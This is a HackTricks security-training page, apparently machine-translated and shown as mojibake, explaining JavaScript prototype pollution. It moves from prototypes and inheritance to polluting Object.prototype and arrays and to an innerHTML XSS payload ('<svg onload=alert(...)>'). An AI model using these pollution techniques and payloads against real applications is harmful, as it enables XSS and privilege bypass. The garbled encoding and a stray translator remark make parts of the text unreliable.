# NodeJS - \_\_proto\_\_ & prototype Pollution

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ.

</details>

## JavaScript рдореЗрдВ Objects <a href="#053a" id="053a"></a>

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рд╣рдореЗрдВ JavaScript рдореЗрдВ `Object` рдХреЛ рд╕рдордЭрдирд╛ рд╣реЛрдЧрд╛ред рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рд╕рд┐рд░реНрдл рдПрдХ рдХрд▓реЗрдХреНрд╢рди рд╣реЛрддрд╛ рд╣реИ рдХреА рдФрд░ рд╡реИрд▓реНрдпреВ рдкреЗрдпрд░реНрд╕ рдХрд╛, рдЬрд┐рд╕реЗ рдЕрдХреНрд╕рд░ рдЙрд╕ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреА рдкреНрд░реЙрдкрд░реНрдЯреАрдЬ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

![](<../../../.gitbook/assets/image (389) (1).png>)

JavaScript рдореЗрдВ, `Object` рдПрдХ рдмреЗрд╕рд┐рдХ рдСрдмреНрдЬреЗрдХреНрдЯ рд╣реИ, рд╕рднреА рдирдП рдмрдирд╛рдП рдЧрдП рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯред рдПрдХ рдЦрд╛рд▓реА рдСрдмреНрдЬреЗрдХреНрдЯ `null` рдХреЛ `Object.create` рдореЗрдВ рдкрд╛рд╕ рдХрд░рдХреЗ рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдирдпрд╛ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рднреА рдПрдХ рдЯрд╛рдЗрдк рд╣реЛрдЧрд╛ рдЬреЛ рдкрд╛рд╕ рдХрд┐рдП рдЧрдП рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рдЕрдиреБрд░реВрдк рд╣реЛрддрд╛ рд╣реИ рдФрд░ рд╕рднреА рдмреЗрд╕рд┐рдХ рдкреНрд░реЙрдкрд░реНрдЯреАрдЬ рдХреЛ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИред
```javascript
console.log(Object.create(null)); // prints an empty object
```
![](<../../../.gitbook/assets/image (360).png>)

рдкрд╣рд▓реЗ рд╣рдордиреЗ рд╕реАрдЦрд╛ рдХрд┐ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреБрдВрдЬреА рдФрд░ рдорд╛рдиреЛрдВ рдХрд╛ рд╕рдВрдЧреНрд░рд╣ рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рд╕рдордЭ рдореЗрдВ рдЖрддрд╛ рд╣реИ рдХрд┐ рдПрдХ `null` рдСрдмреНрдЬреЗрдХреНрдЯ рдмрд╕ рдПрдХ рдЦрд╛рд▓реА рд╢рдмреНрджрдХреЛрд╢ рд╣реИ: `{}`

## рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рдлрдВрдХреНрд╢рдиреНрд╕ / рдХреНрд▓рд╛рд╕реЗрд╕ <a href="#55dd" id="55dd"></a>

рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ, рдХреНрд▓рд╛рд╕ рдФрд░ рдлрдВрдХреНрд╢рди рдХреА рдЕрд╡рдзрд╛рд░рдгрд╛рдПрдВ рдХрд╛рдлреА рдЖрдкрд╕ рдореЗрдВ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИрдВ (рдлрдВрдХреНрд╢рди рд╕реНрд╡рдпрдВ рдХреНрд▓рд╛рд╕ рдХреЗ рд▓рд┐рдП рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИ рдФрд░ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдкреНрд░рдХреГрддрд┐ рдореЗрдВ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ "рдХреНрд▓рд╛рд╕" рдХреА рдЕрд╡рдзрд╛рд░рдгрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ)ред рдЖрдЗрдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рджреЗрдЦреЗрдВ:
```javascript
function person(fullName, age) {
this.age = age;
this.fullName = fullName;
this.details = function() {
return this.fullName + " has age: " + this.age;
}
}
```
Since there is no English text provided other than the image reference, which is not translatable, there is no translation to provide. The markdown syntax remains unchanged:

```markdown
![](<../../../.gitbook/assets/image (361).png>)
```
```javascript
var person1 = new person("Satoshi", 70);
```
![](<../../../.gitbook/assets/image (362).png>)

## JavaScript рдореЗрдВ Prototypes <a href="#3843" id="3843"></a>

рдзреНрдпрд╛рди рджреЗрдиреЗ рдпреЛрдЧреНрдп рдмрд╛рдд рдпрд╣ рд╣реИ рдХрд┐ prototype рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╕рдордп рдмрджрд▓рд╛/рд╕рдВрд╢реЛрдзрд┐рдд/рд╣рдЯрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдХреНрд▓рд╛рд╕ рдХреЗ рдлрдВрдХреНрд╢рдиреНрд╕ рдХреЛ рдЧрддрд┐рд╢реАрд▓ рд░реВрдк рд╕реЗ рдЬреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

![](<../../../.gitbook/assets/image (363).png>)

рдХреНрд▓рд╛рд╕ рдХреЗ рдлрдВрдХреНрд╢рдиреНрд╕ рдХреЛ рднреА рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдЬреИрд╕реЗ `toString` рдпрд╛ `valueOf` рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдорд╛рдорд▓реЛрдВ рдореЗрдВ):

![](<../../../.gitbook/assets/image (364).png>)

![](<../../../.gitbook/assets/image (365).png>)

## рд╡рд┐рд░рд╛рд╕рдд

рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк-рдЖрдзрд╛рд░рд┐рдд рдкреНрд░реЛрдЧреНрд░рд╛рдо рдореЗрдВ, рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреНрд▓рд╛рд╕реЗрд╕ рд╕реЗ рдЧреБрдг/рд╡рд┐рдзрд┐рдпрд╛рдБ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВред рдХреНрд▓рд╛рд╕реЗрд╕ рдХреЛ рджреВрд╕рд░реА рдХреНрд▓рд╛рд╕ рдХреЗ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдЧреБрдг/рд╡рд┐рдзрд┐рдпрд╛рдБ рдЬреЛрдбрд╝рдХрд░ рдпрд╛ рдПрдХ рдЦрд╛рд▓реА рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рдЬреЛрдбрд╝рдХрд░ рд╡реНрдпреБрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐, рдпрджрд┐ рдЖрдк рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рдПрдХ рдЧреБрдг рдЬреЛрдбрд╝рддреЗ рд╣реИрдВ рдЬреЛ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЗ рдПрдХ рд╕рдореВрд╣ рдХреЗ рд▓рд┐рдП рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдпреБрдХреНрдд рд╣реЛрддрд╛ рд╣реИ (рдЬреИрд╕реЗ рдХрд┐ myPersonObj), рддреЛ рдЬрд┐рди рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЗ рд▓рд┐рдП рдпрд╣ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рд╣реИ рдЙрдиреНрд╣реЗрдВ рднреА рдирдпрд╛ рдЧреБрдг рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рд╡рд╣ рдЧреБрдг рддрдм рддрдХ рдкреНрд░рд┐рдВрдЯ рдирд╣реАрдВ рд╣реЛрддрд╛ рдЬрдм рддрдХ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЙрд╕ рдкрд░ рдХреЙрд▓ рди рдХрд┐рдпрд╛ рдЬрд╛рдПред

![](<../../../.gitbook/assets/image (366).png>)

## \_\_proto\_\_ рдкреНрд░рджреВрд╖рдг <a href="#0d0a" id="0d0a"></a>

рдЖрдкрдХреЛ рдкрд╣рд▓реЗ рд╣реА рдЬреНрдЮрд╛рдд рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ **JavaScript рдореЗрдВ рд╣рд░ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗрд╡рд▓ рдХреБрдВрдЬреА рдФрд░ рдорд╛рди** рдХреЗ рд╕рдВрдЧреНрд░рд╣ рд╕реЗ рдмрдирд╛ рд╣реЛрддрд╛ рд╣реИ рдФрд░ **рд╣рд░ рдСрдмреНрдЬреЗрдХреНрдЯ JavaScript рдореЗрдВ Object рдкреНрд░рдХрд╛рд░ рд╕реЗ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рдорд┐рд▓рддрд╛ рд╣реИ**ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдпрджрд┐ рдЖрдк Object рдкреНрд░рдХрд╛рд░ рдХреЛ рдкреНрд░рджреВрд╖рд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИрдВ **рддреЛ рдкрд░реНрдпрд╛рд╡рд░рдг рдХрд╛ рдкреНрд░рддреНрдпреЗрдХ JavaScript рдСрдмреНрдЬреЗрдХреНрдЯ рдкреНрд░рджреВрд╖рд┐рдд рд╣реЛ рдЬрд╛рдПрдЧрд╛!**

рдпрд╣ рдХрд╛рдлреА рд╕рд░рд▓ рд╣реИ, рдЖрдкрдХреЛ рдХреЗрд╡рд▓ рдХрд┐рд╕реА рдордирдорд╛рдиреЗ JavaScript рдСрдмреНрдЬреЗрдХреНрдЯ рд╕реЗ рдХреБрдЫ рдЧреБрдг (рдХреБрдВрдЬреА-рдорд╛рди рдЬреЛрдбрд╝реЗ) рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдХреНрдпреЛрдВрдХрд┐ рдкреНрд░рддреНрдпреЗрдХ рдСрдмреНрдЬреЗрдХреНрдЯ Object рд╕реЗ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рдорд┐рд▓рддрд╛ рд╣реИ, рдкреНрд░рддреНрдпреЗрдХ рдСрдмреНрдЬреЗрдХреНрдЯ Object рдпреЛрдЬрдирд╛ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддрд╛ рд╣реИред
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
```
рдкрд┐рдЫрд▓реЗ рдЙрджрд╛рд╣рд░рдг рд╕реЗ, Object рдХреА рд╕рдВрд░рдЪрдирд╛ рддрдХ рдкрд╣реБрдБрдЪрдирд╛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░реАрдХреЛрдВ рд╕реЗ рд╕рдВрднрд╡ рд╣реИ:
```javascript
person1.__proto__.__proto__
person.__proto__.__proto__
```
рддреЛ, рдЬреИрд╕рд╛ рдХрд┐ рдкрд╣рд▓реЗ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдЕрдЧрд░ рдЕрдм рдПрдХ рд╕рдВрдкрддреНрддрд┐ Object рд╕реНрдХреАрдо рдореЗрдВ рдЬреЛрдбрд╝реА рдЬрд╛рддреА рд╣реИ, рд╣рд░ JavaScript рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдирдИ рд╕рдВрдкрддреНрддрд┐ рддрдХ рдкрд╣реБрдБрдЪ рд╣реЛрдЧреА:
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person1.__proto__.__proto__.printHello = function(){console.log("Hello");}
person1.printHello() //This now works and prints hello
//Add constant as new property
person1.__proto__.__proto__.globalconstant = true
person1.globalconstant  //This now works and is "true"
```
рддреЛ рдЕрдм рдкреНрд░рддреНрдпреЗрдХ JS рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рдирдП рдЧреБрдг рд╢рд╛рдорд┐рд▓ рд╣реЛрдВрдЧреЗ: рдлрд╝рдВрдХреНрд╢рди `printHello` рдФрд░ рдирдпрд╛ рд╕реНрдерд┐рд░рд╛рдВрдХ `globalconstant`

## рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг

рдпрд╣ рддрдХрдиреАрдХ рдкрд┐рдЫрд▓реА рд╡рд╛рд▓реА рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рднрд╛рд╡реА рдирд╣реАрдВ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдк JS рдСрдмреНрдЬреЗрдХреНрдЯ рдХреА рд╕реНрдХреАрдо рдХреЛ рдкреНрд░рджреВрд╖рд┐рдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗред рд▓реЗрдХрд┐рди рдЬрд╣рд╛рдВ **рдХреАрд╡рд░реНрдб `__proto__` рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡рд░реНрдЬрд┐рдд рд╣реИ, рд╡рд╣рд╛рдВ рдпрд╣ рддрдХрдиреАрдХ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддреА рд╣реИ**ред

рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдЧреБрдгреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИрдВ, рддреЛ рдЖрдк рдЙрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЗ `prototype` рдЧреБрдг рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдкреНрд░рддреНрдпреЗрдХ рдирдпрд╛ рдЧреБрдг рдЬреЛ рдЖрдк рдпрд╣рд╛рдВ рдЬреЛрдбрд╝рддреЗ рд╣реИрдВ, рд╡рд╣ рдкреНрд░рддреНрдпреЗрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рджреНрд╡рд╛рд░рд╛ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рдорд┐рд▓реЗрдЧрд╛ рдЬреЛ рдЙрд╕ рдлрд╝рдВрдХреНрд╢рди рд╕реЗ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ:**
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person.prototype.sayHello = function(){console.log("Hello");}
person1.sayHello() //This now works and prints hello
//Add constant as new property
person.prototype.newConstant = true
person1.newConstant //This now works and is "true"

//The same could be achieved using this other way:
person1.constructor.prototype.sayHello = function(){console.log("Hello");}
person1.constructor.prototype.newConstant = true
```
рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдХреЗрд╡рд▓ **`person` рдХреНрд▓рд╛рд╕ рд╕реЗ рдмрдирд╛рдП рдЧрдП рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕** рдкреНрд░рднрд╛рд╡рд┐рдд рд╣реЛрдВрдЧреЗ, рд▓реЗрдХрд┐рди рдЙрдирдореЗрдВ рд╕реЗ рдкреНрд░рддреНрдпреЗрдХ рдЕрдм **`sayHello` рдФрд░ `newConstant` рдЧреБрдгреЛрдВ рдХреЛ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧрд╛**ред

**рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рд░ JS рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдЬрд╣рд░ рджреЗрдиреЗ рдХреЗ 2 рддрд░реАрдХреЗ рд╣реИрдВред**

рдкрд╣рд▓рд╛ рддрд░реАрдХрд╛ рд╣реЛрдЧрд╛ **Object** рдХреЗ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░реЙрдкрд░реНрдЯреА рдХреЛ рдкреНрд░рджреВрд╖рд┐рдд рдХрд░рдирд╛ (рдЬреИрд╕рд╛ рдХрд┐ рдкрд╣рд▓реЗ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рд╣рд░ JS рдСрдмреНрдЬреЗрдХреНрдЯ рдЗрд╕рд╕реЗ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рдорд┐рд▓рддрд╛ рд╣реИ):
```javascript
Object.prototype.sayBye = function(){console.log("bye!")}
```
рдпрджрд┐ рдЖрдк рдРрд╕рд╛ рдХрд░рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдкреНрд░рддреНрдпреЗрдХ JS рдСрдмреНрдЬреЗрдХреНрдЯ `sayBye` рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛ред

рджреВрд╕рд░рд╛ рддрд░реАрдХрд╛ рд╣реИ рдХрд┐рд╕реА рдбрд┐рдХреНрд╢рдирд░реА рд╡реЗрд░рд┐рдПрдмрд▓ рдХреЗ рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░ рдХреЗ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдХреА рддрд░рд╣ рдЬрд╣рд░реАрд▓рд╛ рдмрдирд╛рдирд╛:
```javascript
something = {"a": "b"}
something.constructor.prototype.sayHey = function(){console.log("Hey!")}
```
рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, **рдкреНрд░рддреНрдпреЗрдХ JS рдСрдмреНрдЬреЗрдХреНрдЯ `sayHey` рдлрдВрдХреНрд╢рди рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛**ред

## рдЕрдиреНрдп рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рдкреНрд░рджреВрд╖рд┐рдд рдХрд░рдирд╛

### рдПрдХ рдХреНрд▓рд╛рд╕ рд╕реЗ `Object.prototype` рддрдХ

рдПрдХ рдкрд░рд┐рджреГрд╢реНрдп рдореЗрдВ рдЬрд╣рд╛рдБ рдЖрдк **рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдкреНрд░рджреВрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдЖрдкрдХреЛ **`Object.prototype` рддрдХ рдкрд╣реБрдБрдЪрдирд╛ рд╣реИ**, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рдХреА рддрд░рд╣ рдХреБрдЫ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### рдРрд░реЗ рдПрд▓рд┐рдореЗрдВрдЯреНрд╕ рдкреЛрд▓реНрдпреВрд╢рди

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЬреИрд╕реЗ рдЖрдк JS рдореЗрдВ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЗ рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯреНрд╕ рдХреЛ рдкреЛрд▓реНрдпреВрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЕрдЧрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХрд┐рд╕реА рдРрд░реЗ рдХреЛ рдкреЛрд▓реНрдпреВрдЯ рдХрд░рдиреЗ рдХреА рдкрд╣реБрдВрдЪ рд╣реИ рддреЛ рдЖрдк **рдЗрдВрдбреЗрдХреНрд╕ рджреНрд╡рд╛рд░рд╛ рдкрд╣реБрдВрдЪ рдпреЛрдЧреНрдп** рдРрд░реЗ рдХреЗ **рдорд╛рдиреЛрдВ рдХреЛ рднреА рдкреЛрд▓реНрдпреВрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдк рдорд╛рдиреЛрдВ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ, рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рдЙрди рдЗрдВрдбреЗрдХреНрд╕реЗрд╕ рдХреЛ рдкреЛрд▓реНрдпреВрдЯ рдХрд░рдиреЗ рдХреА рдЬрд░реВрд░рдд рд╣реИ рдЬреЛ рдХрд┐рд╕реА рддрд░рд╣ рд╕реЗ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдкрд░ рд▓рд┐рдЦреЗ рдирд╣реАрдВ рдЬрд╛рддреЗ рд╣реИрдВ).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Html рддрддреНрд╡реЛрдВ рдХрд╛ рдкреНрд░рджреВрд╖рдг

JS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ HTML рддрддреНрд╡ рдЙрддреНрдкрдиреНрди рдХрд░рддреЗ рд╕рдордп **`innerHTML`** рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ **рдЕрдзрд┐рд▓реЗрдЦрд┐рдд** рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рддрд╛рдХрд┐ рдпрд╣ **рдордирдорд╛рдирд╛ HTML рдХреЛрдб рд▓рд┐рдЦ рд╕рдХреЗред** [рдЗрд╕ рд▓реЗрдЦрди рд╕реЗ рд╡рд┐рдЪрд╛рд░ рдФрд░ рдЙрджрд╛рд╣рд░рдг](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## рдЙрджрд╛рд╣рд░рдг

### рдореВрд▓ рдЙрджрд╛рд╣рд░рдг

рддреЛ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рдХрд╣рд╛рдБ рд╣реЛрддрд╛ рд╣реИ? рдпрд╣ рддрдм рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдПрдХ рдмрдЧ рд╣реЛрддрд╛ рд╣реИ рдЬреЛ `Object.prototype` рдХреЗ рдЧреБрдгреЛрдВ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдмрдирд╛рддрд╛ рд╣реИред рдЪреВрдВрдХрд┐ рд╣рд░ рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдСрдмреНрдЬреЗрдХреНрдЯ `Object.prototype` рд╕реЗ рдЕрдкрдиреЗ рдЧреБрдгреЛрдВ рдХреЛ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ, рд╣рдо рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВред рд╕рдмрд╕реЗ рдЖрдо рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рдЙрджрд╛рд╣рд░рдг рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реИ:
```javascript
if (user.isAdmin) {   // do something important!}
```
